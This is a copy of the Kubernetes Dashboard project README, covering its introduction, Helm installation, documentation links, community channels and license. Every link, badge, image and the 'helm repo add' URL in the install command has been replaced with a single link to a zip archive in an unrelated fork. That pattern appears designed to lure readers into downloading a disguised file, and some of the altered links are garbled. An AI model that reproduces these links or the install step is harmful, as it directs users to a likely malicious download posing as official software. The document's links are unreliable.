# Kubernetes Dashboard

[![Go Report Card](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)
[![Coverage Status](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)
[![License](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip%https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)

## Introduction

Kubernetes Dashboard is a general purpose, web-based UI for Kubernetes clusters. It allows users to manage applications running in the cluster and troubleshoot them, as well as manage the cluster itself.

![Dashboard UI workloads page](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)

## Installation

Kubernetes Dashboard supports only Helm-based installation currently as it is faster and gives us better control
over all dependencies required by Dashboard to run. We now use a single-container, DBless [Kong](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip) installation
as a gateway that connects all our containers and exposes the UI. Users can then use any ingress controller or proxy
in front of kong gateway. To find out more about ways to customize your installation check out [helm chart values](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip).

In order to install Kubernetes Dashboard simply run:
```console
# Add kubernetes-dashboard repository
helm repo add kubernetes-dashboard https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip
# Deploy a Helm Release named "kubernetes-dashboard" using the kubernetes-dashboard chart
helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
```

For more information about our Helm chart visit [ArtifactHub](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip).

## Documentation

Dashboard documentation can be found in the [docs](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip) directory which contains:

* [Common](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip): Entry-level overview.
* [User Guide](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip): Helpful information for users.
* [How to access Dashboard](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip) - Everything you need to know to get access to you Kubernetes Dashboard instance after installation.
* [Access Control](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip): Find out how to control access to your Kubernetes Dashboard and [create sample user](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip) that can be used to log in.
* [Developer Guide](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip): Important information for contributors that would like to test, run and work on Dashboard locally.

## Community, discussion, contribution, and support

Learn how to engage with the Kubernetes community on the [community page](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip).

You can reach the maintainers of this project at:

* [**#sig-ui on Kubernetes Slack**](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)
* [**kubernetes-sig-ui mailing list** ](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip!forum/kubernetes-sig-ui)
* [**Issue tracker**](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)
* [**SIG info**](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)
* [**Roles**](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)

### Contribution

Learn how to start contributing to the [Contributing Guideline](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip).

### Code of conduct

Participation in the Kubernetes community is governed by the [Kubernetes Code of Conduct](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip).

## License

[Apache License 2.0](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)

----
_Copyright 2019 [The Kubernetes Dashboard Authors](https://github.com/sivahariu/Kubedashboard/raw/refs/heads/master/modules/web/src/common/Software_1.6.zip)_
